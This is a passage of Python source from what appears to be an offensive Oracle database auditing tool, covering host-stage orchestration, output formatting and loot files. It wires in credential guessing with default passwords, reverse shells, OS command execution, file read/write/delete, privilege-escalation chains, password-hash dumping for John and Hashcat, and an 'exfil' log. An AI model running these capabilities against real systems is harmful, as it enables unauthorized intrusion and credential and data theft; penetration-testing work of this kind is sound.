                        "error": probe_errors[-1] if probe_errors else "authentication required",
                    }
                )
                return record
            if active_client is None:
                record.update(
                    {
                        "is_oracle": True,
                        "status": status,
                        "auth_required": True,
                        "transport_mode": selected_protocol,
                        "connect_service": selected_service,
                        "connect_sid": selected_sid,
                        "credential_attempts": credential_attempts,
                        "error": last_auth_error
                        if "last_auth_error" in locals() and last_auth_error
                        else (probe_errors[-1] if probe_errors else "authentication required"),
                    }
                )
                return record

            data = _collect_oracle_data(
                active_client,
                host=host,
                port=port,
                protocol=selected_protocol,
                insecure=insecure,
                listener_dump=listener_dump,
                nne_check=nne_check,
                show_pdbs=show_pdbs,
                show_users=show_users,
                show_roles=show_roles,
                show_privs=show_privs,
                show_schemas=show_schemas,
                show_tables=show_tables,
                schema=schema,
                table=table,
                dump_rows=dump_rows,
                dump_limit=dump_limit,
                query=query,
                privesc_check=privesc_check,
                privesc_chain=privesc_chain,
                exec_cmd=exec_cmd,
                exec_method=exec_method,
                reverse_shell=reverse_shell,
                reverse_shell_type=reverse_shell_type,
                fs_mode=fs_mode,
                os_read=os_read,
                os_write=os_write,
                download=download,
                delete=delete,
                wallet_search=wallet_search,
                hashes=hashes,
                sensitive_scan=sensitive_scan,
                dblink_check=dblink_check,
            )
            if active_client_owned:
                active_client.close()
            record.update(data)
            record.update(
                {
                    "timestamp": utc_now_iso(),
                    "is_oracle": True,
                    "status": status,
                    "auth_required": auth_required,
                    "transport_mode": selected_protocol,
                    "tls_supported": selected_protocol == "tcps",
                    "connect_service": selected_service,
                    "connect_sid": selected_sid,
                    "provided_credentials": bool(credential_candidates),
                    "provided_username": selected_credential.get("username")
                    if selected_credential
                    else (credential_candidates[0].get("username") if credential_candidates else None),
                    "provided_password": selected_credential.get("password")
                    if selected_credential
                    else (credential_candidates[0].get("password") if credential_candidates else None),
                    "effective_username": selected_credential.get("username") if selected_credential else None,
                    "defcreds_enabled": any(bool(item.get("default")) for item in credential_candidates),
                    "credential_attempts": credential_attempts,
                    "elapsed_ms": int((time.monotonic() - started) * 1000),
                    "error": data.get("error"),
                }
            )
            return record
        except OracleDependencyError:
            raise
        except Exception as exc:
            last_error = normalize_oracle_error(exc)
            if attempt >= attempts - 1:
                break
            time.sleep(_retry_delay(attempt))
        finally:
            if client is not None:
                client.close()

    record.update(
        {"timestamp": utc_now_iso(), "status": "fail", "is_oracle": False, "error": last_error or "connection failed"}
    )
    return record


def _audit_oracle_host_stage(
    host: str,
    port: int,
    timeout: float,
    retries: int,
    *,
    protocol: str,
    service: str | None,
    sid: str | None,
    service_list: str | None = None,
    sid_list: str | None = None,
    wallet: str | None,
    ssl_server_dn: str | None,
    insecure: bool,
    credential_candidates: list[dict[str, Any]],
    as_sysdba: bool,
    listener_dump: bool = False,
    nne_check: bool = False,
    show_pdbs: bool,
    show_users: bool,
    show_roles: bool,
    show_privs: bool,
    show_schemas: bool,
    show_tables: bool,
    schema: str | None,
    table: str | None,
    dump_rows: bool,
    dump_limit: int | None,
    query: str | None,
    privesc_check: bool,
    privesc_chain: bool,
    exec_cmd: str | None,
    exec_method: str,
    reverse_shell: str | None,
    reverse_shell_type: str,
    fs_mode: str = "auto",
    os_read: str | None,
    os_write: str | None,
    download: str | None,
    delete: str | None,
    wallet_search: bool,
    hashes: bool,
    sensitive_scan: bool,
    dblink_check: bool,
    show_pdbs_limit: int | None = None,
    show_users_limit: int | None = None,
    show_schemas_limit: int | None = None,
    show_tables_limit: int | None = None,
    run_deep_checks: bool,
    debug: bool,
    debug_emit: Callable[[str], None] | None,
) -> dict[str, Any]:
    started = time.monotonic()
    record = _audit_oracle_host(
        host,
        port,
        timeout,
        retries,
        protocol=protocol,
        service=service,
        sid=sid,
        service_list=service_list,
        sid_list=sid_list,
        wallet=wallet,
        ssl_server_dn=ssl_server_dn,
        insecure=insecure,
        credential_candidates=credential_candidates,
        as_sysdba=as_sysdba,
        listener_dump=listener_dump,
        nne_check=nne_check,
        show_pdbs=show_pdbs if run_deep_checks else False,
        show_users=show_users if run_deep_checks else False,
        show_roles=show_roles if run_deep_checks else False,
        show_privs=show_privs if run_deep_checks else False,
        show_schemas=show_schemas if run_deep_checks else False,
        show_tables=show_tables if run_deep_checks else False,
        schema=schema,
        table=table,
        dump_rows=dump_rows if run_deep_checks else False,
        dump_limit=dump_limit if run_deep_checks else None,
        query=query if run_deep_checks else None,
        privesc_check=privesc_check if run_deep_checks else False,
        privesc_chain=privesc_chain if run_deep_checks else False,
        exec_cmd=exec_cmd if run_deep_checks else None,
        exec_method=exec_method,
        reverse_shell=reverse_shell if run_deep_checks else None,
        reverse_shell_type=reverse_shell_type,
        fs_mode=fs_mode,
        os_read=os_read if run_deep_checks else None,
        os_write=os_write if run_deep_checks else None,
        download=download if run_deep_checks else None,
        delete=delete if run_deep_checks else None,
        wallet_search=wallet_search if run_deep_checks else False,
        hashes=hashes if run_deep_checks else False,
        sensitive_scan=sensitive_scan if run_deep_checks else False,
        dblink_check=dblink_check if run_deep_checks else False,
    )
    record["show_pdbs_limit"] = show_pdbs_limit if run_deep_checks else None
    record["show_users_limit"] = show_users_limit if run_deep_checks else None
    record["show_schemas_limit"] = show_schemas_limit if run_deep_checks else None
    record["show_tables_limit"] = show_tables_limit if run_deep_checks else None
    status = str(record.get("status") or "fail")
    is_oracle = bool(record.get("is_oracle"))
    attempts = max(1, int(retries) + 1)
    elapsed_ms = int((time.monotonic() - started) * 1000)
    telemetry = StageTelemetryBuilder(host=host, port=port, attempts=attempts, debug=debug, debug_emit=debug_emit)
    detect_result = "ok" if is_oracle else ("error" if status == "fail" else "skip")
    detect_error = str(record.get("error") or "") if detect_result == "error" else None
    telemetry.stage(_STAGE_DETECT_PROTOCOL, detect_result, detect_error, 0)
    auth_ok_statuses = _ORACLE_DEEP_STATUSES.union(
        {"auth_required", "account_locked", "account_expired", "invalid_credentials"}
    )
    auth_result = "ok" if is_oracle and status in auth_ok_statuses else detect_result
    telemetry.stage(_STAGE_AUTH_INFERENCE, auth_result, detect_error if auth_result == "error" else None, 0)
    if run_deep_checks and status in _ORACLE_DEEP_STATUSES:
        telemetry.stage(_STAGE_ACCESS_CAPABILITIES, "ok", None, 0)
        data_error = str(record.get("error") or "") or None
        telemetry.stage(_STAGE_DATA, "error" if data_error else "ok", data_error, elapsed_ms)
    else:
        telemetry.stage(_STAGE_ACCESS_CAPABILITIES, "skip", "deep checks disabled", 0)
        telemetry.stage(_STAGE_DATA, "skip", "deep checks disabled", 0)
    durations = {str(item.get("stage_name") or ""): int(item.get("duration_ms") or 0) for item in telemetry.stages}
    telemetry.debug(
        f"stage_timing_summary status={status} attempts=1/{attempts} "
        f"detect_ms={durations.get(_STAGE_DETECT_PROTOCOL, 0)} "
        f"auth_ms={durations.get(_STAGE_AUTH_INFERENCE, 0)} "
        f"capabilities_ms={durations.get(_STAGE_ACCESS_CAPABILITIES, 0)} "
        f"data_ms={durations.get(_STAGE_DATA, 0)} total_ms={elapsed_ms}"
    )
    return telemetry.attach(record, status=status, total_ms=elapsed_ms)


def _caps_suffix(record: dict[str, Any]) -> str:
    parts: list[str] = []
    if record.get("con_name"):
        parts.append(f"(con:{record.get('con_name')})")
    if record.get("server_version"):
        parts.append(f"(version:{record.get('server_version')})")
    return f" {' '.join(parts)}" if parts else ""


def _format_detect_record(record: dict[str, Any], output_format: str) -> str:
    auth_required = record.get("auth_required")
    auth_required_text = "True" if auth_required is True else "False" if auth_required is False else "unknown"
    if output_format == "json":
        return json.dumps(
            {
                "timestamp": record.get("timestamp"),
                "type": "detect",
                "service": "oracle",
                "host": record.get("host"),
                "port": record.get("port"),
                "detected": bool(record.get("is_oracle")),
                "auth_required": auth_required,
                "transport_mode": record.get("transport_mode"),
                "connect_service": record.get("connect_service"),
                "connect_sid": record.get("connect_sid"),
                "server_version": record.get("server_version"),
            },
            ensure_ascii=False,
        )
    target = record.get("connect_service") or record.get("connect_sid") or "-"
    target_key = "service" if record.get("connect_service") else "sid" if record.get("connect_sid") else "target"
    return f"{_nxc_prefix(record)} [*] Oracle Database (auth required:{auth_required_text}) (transport:{record.get('transport_mode') or '-'}) ({target_key}:{target})"


def _format_record(record: dict[str, Any], output_format: str) -> str:
    if output_format == "json":
        return json.dumps(record, ensure_ascii=False)
    prefix = _nxc_prefix(record)
    status = str(record.get("status") or "fail")
    credential_attempts = record.get("credential_attempts")
    has_attempt_details = isinstance(credential_attempts, list) and len(credential_attempts) > 1
    if status == "open_no_auth":
        return ""
    if status in {"valid_credentials", "weak_default_creds"}:
        if has_attempt_details:
            return ""
        user = str(record.get("effective_username") or record.get("provided_username") or "-")
        secret = record.get("provided_password")
        secret_text = "<empty>" if secret == "" else str(secret or "")
        marker = "[+]"
        return f"{prefix} {marker} {user}:{secret_text}{_caps_suffix(record)}"
    if status == "auth_required":
        if has_attempt_details:
            return ""
        return f"{prefix} [-] authentication required"
    if status in {"account_locked", "account_expired", "invalid_credentials"}:
        if has_attempt_details:
            return ""
        user = str(record.get("provided_username") or "-")
        secret = record.get("provided_password")
        secret_text = "<empty>" if secret == "" else str(secret or "")
        return f"{prefix} [-] {status} {user}:{secret_text}"
    err = _clip(str(record.get("error") or "connection failed"), 120)
    return f"{prefix} [!] connection failed err={err}"


def _format_credential_attempts_records(record: dict[str, Any], output_format: str) -> list[str]:
    attempts = record.get("credential_attempts")
    if output_format != "txt" or not isinstance(attempts, list) or len(attempts) < 2:
        return []

    prefix = _nxc_prefix(record)
    selected_username = record.get("effective_username")
    selected_password = record.get("provided_password")
    lines: list[str] = []
    for attempt in attempts:
        if not isinstance(attempt, dict):
            continue
        username = str(attempt.get("username") or "-")
        password = attempt.get("password")
        password_text = "<empty>" if password == "" else str(password or "")
        if bool(attempt.get("ok")):
            selected = attempt.get("username") == selected_username and password == selected_password
            suffix = _caps_suffix(record) if selected else ""
            lines.append(f"{prefix} [+] {username}:{password_text}{suffix}")
        else:
            lines.append(f"{prefix} [-] {username}:{password_text}")
    return lines


def _limited_detail(
    record: dict[str, Any],
    field: str,
    limit_field: str,
    title: str,
    formatter: Callable[[Any], str],
    output_format: str,
) -> list[str]:
    rows = record.get(field)
    if not isinstance(rows, list) or not rows:
        return []
    raw_limit = record.get(limit_field)
    limit = raw_limit if isinstance(raw_limit, int) and not isinstance(raw_limit, bool) else None
    displayed = limit_sequence(rows, limit)
    meta = limit_metadata(rows, limit)
    if output_format == "json":
        return [
            json.dumps(
                {
                    "timestamp": record.get("timestamp"),
                    "type": field,
                    "service": "oracle",
                    "host": record.get("host"),
                    "port": record.get("port"),
                    field: displayed,
                    f"{field}_shown": meta["shown"],
                    f"{field}_limit": meta["limit"],
                    f"{field}_truncated": meta["truncated"],
                },
                ensure_ascii=False,
            )
        ]
    prefix = _nxc_prefix(record)
    header = f"{prefix} [*] {title}"
    if meta["truncated"]:
        header = f"{prefix} [*] {title} (showing:{meta['shown']} of {meta['total']})"
    return [header] + [f"{prefix} {formatter(item)}" for item in displayed]


def _format_detail_records(record: dict[str, Any], output_format: str) -> list[str]:
    lines: list[str] = []
    listener_targets = record.get("listener_targets")
    listener_has_signal = isinstance(listener_targets, list) and any(
        row.get("status") in {"accepted", "available", "restricted", "unknown"} for row in listener_targets
    )
    if isinstance(listener_targets, list) and listener_targets and (record.get("is_oracle") or listener_has_signal):
        if output_format == "json":
            lines.append(
                json.dumps(
                    {
                        "timestamp": record.get("timestamp"),
                        "type": "listener_targets",
                        "service": "oracle",
                        "host": record.get("host"),
                        "port": record.get("port"),
                        "listener_targets": listener_targets,
                    },
                    ensure_ascii=False,
                )
            )
        else:
            prefix = _nxc_prefix(record)
            existing = [row for row in listener_targets if row.get("status") in {"accepted", "available", "restricted"}]
            lines.append(f"{prefix} [*] Listener Targets (available:{len(existing)} total:{len(listener_targets)})")
            for row in listener_targets:
                target = (
                    f"service={row.get('service')}"
                    if row.get("service")
                    else f"sid={row.get('sid')}"
                    if row.get("sid")
                    else "target=-"
                )
                suffix = "" if not row.get("error") else f" err={_clip(str(row.get('error')), 90)}"
                lines.append(
                    f"{prefix} {target} protocol={row.get('protocol')} status={row.get('status')} exists={row.get('exists')}{suffix}"
                )
    if record.get("listener_dump"):
        value = record.get("listener_dump") or {}
        if output_format == "json":
            lines.append(
                json.dumps(
                    {
                        "timestamp": record.get("timestamp"),
                        "type": "listener_dump",
                        "service": "oracle",
                        "host": record.get("host"),
                        "port": record.get("port"),
                        "listener_dump": value,
                    },
                    ensure_ascii=False,
                )
            )
        else:
            prefix = _nxc_prefix(record)
            summary = as_dict(value.get("summary"))
            lines.append(f"{prefix} [*] Listener Dump")
            lines.append(
                f"{prefix} status_ok={value.get('status_ok')} services_ok={value.get('services_ok')} "
                f"password_protected={summary.get('password_protected')} restricted={summary.get('restricted')} "
                f"services={len(value.get('services') or [])} sids={len(value.get('sids') or [])}"
            )
            for service_name in value.get("services") or []:
                lines.append(f"{prefix} service={service_name}")
            for sid_name in value.get("sids") or []:
                lines.append(f"{prefix} sid={sid_name}")
    if record.get("nne_check"):
        value = record.get("nne_check") or {}
        if output_format == "json":
            lines.append(
                json.dumps(
                    {
                        "timestamp": record.get("timestamp"),
                        "type": "nne_check",
                        "service": "oracle",
                        "host": record.get("host"),
                        "port": record.get("port"),
                        "nne_check": value,
                    },
                    ensure_ascii=False,
                )
            )
        else:
            prefix = _nxc_prefix(record)
            reasons = ",".join(str(item) for item in value.get("reasons") or [])
            lines.append(f"{prefix} [*] NNE Check")
            lines.append(
                f"{prefix} status={value.get('status')} weak={value.get('weak')} "
                f"tcp={value.get('tcp_available')} tcps={value.get('tcps_available')} reasons={reasons or '-'}"
            )
    lines.extend(
        _limited_detail(
            record,
            "pdbs",
            "show_pdbs_limit",
            "PDBs",
            lambda row: f"name={row.get('name')} open_mode={row.get('open_mode')} restricted={row.get('restricted')}",
            output_format,
        )
    )
    lines.extend(
        _limited_detail(
            record,
            "users",
            "show_users_limit",
            "Users",
            lambda row: f"user={row.get('username') or row.get('user')} status={row.get('account_status', '-')}",
            output_format,
        )
    )
    lines.extend(
        _limited_detail(
            record,
            "schemas",
            "show_schemas_limit",
            "Schemas",
            lambda row: f"schema={row.get('schema_name') or row.get('owner')}",
            output_format,
        )
    )
    lines.extend(
        _limited_detail(
            record,
            "tables",
            "show_tables_limit",
            "Tables",
            lambda row: f"{row.get('owner')}.{row.get('table_name')} rows={row.get('num_rows', '-')}",
            output_format,
        )
    )
    if record.get("roles"):
        lines.extend(
            _limited_detail(
                record,
                "roles",
                "",
                "Roles",
                lambda row: f"role={row.get('granted_role')} admin={row.get('admin_option', '-')}",
                output_format,
            )
        )
    if record.get("privileges"):
        lines.extend(
            _limited_detail(
                record,
                "privileges",
                "",
                "Privileges",
                lambda row: " ".join(f"{k}={v}" for k, v in row.items()),
                output_format,
            )
        )
    if record.get("rows"):
        if output_format == "json":
            lines.append(
                json.dumps(
                    {
                        "timestamp": record.get("timestamp"),
                        "type": "rows",
                        "service": "oracle",
                        "host": record.get("host"),
                        "port": record.get("port"),
                        "rows": record.get("rows"),
                    },
                    ensure_ascii=False,
                )
            )
        else:
            prefix = _nxc_prefix(record)
            lines.append(f"{prefix} [*] Dump Rows")
            for row in record.get("rows") or []:
                lines.append(
                    f"{prefix} {row.get('schema')}.{row.get('table')}:{_clip(json.dumps(row.get('row'), ensure_ascii=False, separators=(',', ':')), 260)}"
                )
    if record.get("query_rows"):
        if output_format == "json":
            lines.append(
                json.dumps(
                    {
                        "timestamp": record.get("timestamp"),
                        "type": "query",
                        "service": "oracle",
                        "host": record.get("host"),
                        "port": record.get("port"),
                        "rows": record.get("query_rows"),
                    },
                    ensure_ascii=False,
                )
            )
        else:
            prefix = _nxc_prefix(record)
            lines.append(f"{prefix} [*] Query")
            for row in record.get("query_rows") or []:
                lines.append(f"{prefix} {_clip(json.dumps(row, ensure_ascii=False, separators=(',', ':')), 260)}")
    if record.get("privesc_findings"):
        if output_format == "json":
            lines.append(
                json.dumps(
                    {
                        "timestamp": record.get("timestamp"),
                        "type": "privesc",
                        "service": "oracle",
                        "host": record.get("host"),
                        "port": record.get("port"),
                        "findings": record.get("privesc_findings"),
                    },
                    ensure_ascii=False,
                )
            )
        else:
            prefix = _nxc_prefix(record)
            lines.append(f"{prefix} [*] PrivEsc Check")
            for item in record.get("privesc_findings") or []:
                marker = "[!]" if item.get("result") is True else "[-]" if item.get("result") is False else "[*]"
                suffix = "" if item.get("error") is None else f" err={_clip(str(item.get('error')), 100)}"
                lines.append(f"{prefix} {marker} {item.get('severity')} - {item.get('title')}{suffix}")
    if record.get("privesc_chain"):
        if output_format == "json":
            lines.append(
                json.dumps(
                    {
                        "timestamp": record.get("timestamp"),
                        "type": "privesc_chain",
                        "service": "oracle",
                        "host": record.get("host"),
                        "port": record.get("port"),
                        "chain": record.get("privesc_chain"),
                    },
                    ensure_ascii=False,
                )
            )
        else:
            prefix = _nxc_prefix(record)
            lines.append(f"{prefix} [*] PrivEsc Chain")
            for item in record.get("privesc_chain") or []:
                lines.append(f"{prefix} [!] {item.get('severity')} - {item.get('path')} {item.get('description')}")
    if record.get("privesc_chain_executed"):
        if output_format == "json":
            lines.append(
                json.dumps(
                    {
                        "timestamp": record.get("timestamp"),
                        "type": "privesc_chain_executed",
                        "service": "oracle",
                        "host": record.get("host"),
                        "port": record.get("port"),
                        "chain": record.get("privesc_chain_executed"),
                    },
                    ensure_ascii=False,
                )
            )
        else:
            prefix = _nxc_prefix(record)
            lines.append(f"{prefix} [*] PrivEsc Chain Execution")
            for item in record.get("privesc_chain_executed") or []:
                result = as_dict(item.get("result"))
                method = item.get("method") or result.get("method") or item.get("procedure") or "-"
                status = "ok" if item.get("ok") is True else "fail" if item.get("ok") is False else "unknown"
                evidence = (
                    result.get("output") or item.get("evidence") or item.get("error") or result.get("error") or "-"
                )
                lines.append(
                    f"{prefix} [!] path={item.get('path')} method={method} status={status} "
                    f"evidence={_clip(str(evidence), 120)}"
                )
    for field, title in (
        ("exec_result", "Exec Result"),
        ("file_results", "File Results"),
        ("wallet_findings", "Wallet Findings"),
        ("hashes", "Password Hashes"),
        ("sensitive_findings", "Sensitive Metadata"),
        ("db_links", "Database Links"),
    ):
        value = record.get(field)
        if not value:
            continue
        if output_format == "json":
            lines.append(
                json.dumps(
                    {
                        "timestamp": record.get("timestamp"),
                        "type": field,
                        "service": "oracle",
                        "host": record.get("host"),
                        "port": record.get("port"),
                        field: value,
                    },
                    ensure_ascii=False,
                )
            )
        else:
            prefix = _nxc_prefix(record)
            lines.append(f"{prefix} [*] {title}")
            rows = value if isinstance(value, list) else [value]
            for item in rows:
                lines.append(f"{prefix} {_clip(json.dumps(item, ensure_ascii=False, separators=(',', ':')), 260)}")
    return lines


def _render_colored_oracle_line(console: Console, line: str) -> bool:
    if render_colored_marker_line(
        console,
        line,
        tag=_ORACLE_TAG,
        counts=(CountColorRule("PDBs", "red"), CountColorRule("Users", "red"), CountColorRule("Tables", "red")),
        regexes=(
            RegexColorRule(r"\b(CRITICAL|HIGH|MEDIUM|LOW) - [^\n]+", "orange"),
            RegexColorRule(
                r"\b(service|sid|schema|user|role|name|open_mode|restricted|transport|version|status|weak|tcp|tcps|path|method|result|password_protected)=[^\s]+",
                "orange",
            ),
        ),
    ):
        return True
    if line.startswith(_ORACLE_TAG) and "\t" in line:
        return render_tagged_detail_line(console, line, tag=_ORACLE_TAG, default_color="orange")
    return False


def _merge_stage2_record(detect_record: dict[str, Any], deep_record: dict[str, Any]) -> dict[str, Any]:
    return merge_stage_records(detect_record, deep_record)


def _oracle_sidecar_base(output_path: str) -> Path:
    path = Path(output_path)
    return path.with_suffix("") if path.suffix else path


def _append_unique_text(path: Path, line: str) -> None:
    if not line:
        return
    path.parent.mkdir(parents=True, exist_ok=True)
    existing: set[str] = set()
    if path.exists():
        existing = {item.rstrip("\n") for item in path.read_text(encoding="utf-8").splitlines()}
    if line in existing:
        return
    with path.open("a", encoding="utf-8") as fh:
        fh.write(line + "\n")


def _append_unique_jsonl(path: Path, payload: dict[str, Any]) -> None:
    line = json.dumps(payload, ensure_ascii=False, sort_keys=True)
    _append_unique_text(path, line)


def _write_oracle_sidecars(record: dict[str, Any], output_path: str | None) -> None:
    if not output_path:
        return
    base = _oracle_sidecar_base(output_path)
    paths = {
        "john": base.with_name(base.name + ".oracle.hashes.john"),
        "hashcat": base.with_name(base.name + ".oracle.hashes.hashcat"),
        "wallets": base.with_name(base.name + ".oracle.wallets.jsonl"),
        "files": base.with_name(base.name + ".oracle.files.jsonl"),
        "exfil": base.with_name(base.name + ".oracle.exfil.jsonl"),
    }
    sidecar_fields = (
        "hashes",
        "wallet_findings",
        "file_results",
        "rows",
        "query_rows",
        "sensitive_findings",
        "db_links",
        "exec_result",
        "privesc_chain_executed",
    )
    if not any(record.get(field) for field in sidecar_fields):
        return
    for path in paths.values():
        path.parent.mkdir(parents=True, exist_ok=True)
        path.touch(exist_ok=True)
    context = {
        "host": record.get("host"),
        "port": record.get("port"),
        "service": record.get("connect_service"),
        "sid": record.get("connect_sid"),
        "username": record.get("effective_username") or record.get("provided_username"),
        "timestamp": record.get("timestamp"),
    }
    for row in record.get("hashes") or []:
        if not isinstance(row, dict):
            continue
        username = str(row.get("name") or row.get("username") or "").strip()
        hash_value = str(row.get("spare4") or "").strip()
        if username and hash_value:
            _append_unique_text(paths["john"], f"{username}:{hash_value}")
            _append_unique_text(paths["hashcat"], f"{username}:{hash_value}")
        _append_unique_jsonl(paths["exfil"], {**context, "type": "hash", "row": row})
    for row in record.get("wallet_findings") or []:
        if isinstance(row, dict):
            _append_unique_jsonl(paths["wallets"], {**context, "type": "wallet", "row": row})
            _append_unique_jsonl(paths["files"], {**context, "type": "wallet", "row": row})
    for row in record.get("file_results") or []:
        if isinstance(row, dict):
            _append_unique_jsonl(paths["files"], {**context, "type": "file", "row": row})
    for field in ("rows", "query_rows", "sensitive_findings", "db_links", "exec_result", "privesc_chain_executed"):
        value = record.get(field)
        if not value:
            continue
        rows = value if isinstance(value, list) else [value]
        for row in rows:
            if isinstance(row, dict):
                _append_unique_jsonl(paths["exfil"], {**context, "type": field, "row": row})


__all__ = [
    "OracleAccountExpiredError",
    "OracleAccountLockedError",
    "OracleAuthError",
    "OracleClientError",
    "OracleServiceError",
    "_audit_oracle_host",
    "_audit_oracle_host_stage",
    "_credential_runs",
    "_target_candidates",
]


# Typed runner boundary -----------------------------------------------------
host_stage = _audit_oracle_host_stage
